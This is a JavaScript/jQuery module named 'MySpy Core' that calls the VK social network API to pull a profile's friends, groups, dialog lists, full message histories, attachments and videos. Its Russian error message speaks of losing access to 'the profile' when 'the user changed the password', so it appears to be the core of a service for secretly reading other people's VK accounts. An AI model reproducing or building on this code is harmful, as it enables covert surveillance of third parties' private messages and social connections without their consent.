if (typeof jQuery === "undefined") {
  throw new Error("MySpy Core requires jQuery");
}

$.core = {}

$.core.supportsLocalStorage = function() {
    try {
        return 'localStorage' in window && window['localStorage'] !== null;
    } catch (e) {
        return false;
    }
}

$.core.request = function(method, params, callback) {
    params['v'] = '5.53';
    $.ajax({
        type: "POST",
        url: "https://api.vk.com/method/" + method,
        data: params,
        success: function(data) {
            if (!('error' in data))
                callback(data['response']);
            else if (data['error']['error_code'] == 5) {
                $('#access_denied').html(' \
                    <div class="callout callout-danger"> \
                        <h4>Доступ к профилю потерян!</h4> \
                        <p>К сожалению, пользователь изменил пароль или администрация ВКонтакте заблокировала доступ к профилю. Попробуйте получить доступ <a href="#">еще раз</a>.</p> \
                    </div> \
                ');
            }
        },
        dataType: 'jsonp'
    });
}

$.core.getFriends = function(params, callback) {
    var maxCount = 10000;
    params['order'] = 'hints';
    params['fields'] = 'photo_100,online';
    params['offset'] = 0;
    params['count'] = 5000;
    for (var i = 0; i < (maxCount - 1) / params['count'] + 1; ++i, params['offset'] += params['count'])
        $.core.request(
            'friends.get',
            params,
            function(data) {
                callback(data['items']);
            }
        );
}

$.core.getGroups = function(params, callback) {
    var maxCount = 5000;
    params['fields'] = 'members_count';
    params['extended'] = 1;
    params['offset'] = 0;
    params['count'] = 1000;
    for (var i = 0; i < (maxCount - 1) / params['count'] + 1; ++i, params['offset'] += params['count'])
        $.core.request(
            'groups.get',
            params,
            function(data) {
                callback(data['items']);
            }
        );
}

$.core.getDialogs = function(params, callback) {
    params['count'] = 50;
    params['preview_length'] = 140;
    $.core.request(
        'messages.getDialogs',
        params,
        function(data) {
            callback(data['items'])
        }
    );
}

$.core.getMessages = function(params, callback) {
    params['count'] = 50;
    $.core.request(
        'messages.getHistory',
        params,
        function(data) {
            callback(data['items'])
        }
    );
}

$.core.getMessagesAttachments = function(params, callback) {
    $.core.request(
        'messages.getHistoryAttachments',
        params,
        callback
    );
}

$.core.getUsers = function(params, callback) {
    $.core.request(
        'users.get',
        params,
        callback
    );
}

$.core.getGroupsById = function(params, callback) {
    $.core.request(
        'groups.getById',
        params,
        callback
    );
}

$.core.getChat = function(params, callback) {
    $.core.request(
        'messages.getChat',
        params,
        callback
    );
}

$.core.getVideo = function(params, callback) {
    $.core.request(
        'video.get',
        params,
        function(data) {
            callback(data['items'])
        }
    );
}

$.core.removeUser = function(id) {
    $.ajax({
        type: "POST",
        url: "/user/remove/" + id,
        success: function(data) {
            location.reload();
        }
    });
}

$.core.normalUrl = function(url) {
    try {
        var pattern = /http:\/\/[^\d]+(\d+)\.vk\.me\/(.*)/;
        var data = url.match(pattern)
        var result = "https://pp.vk.me/c" + data[1] + "/" + data[2];
        return result;
    } catch (err) {
        return url.replace("http://", "https://");
    }
}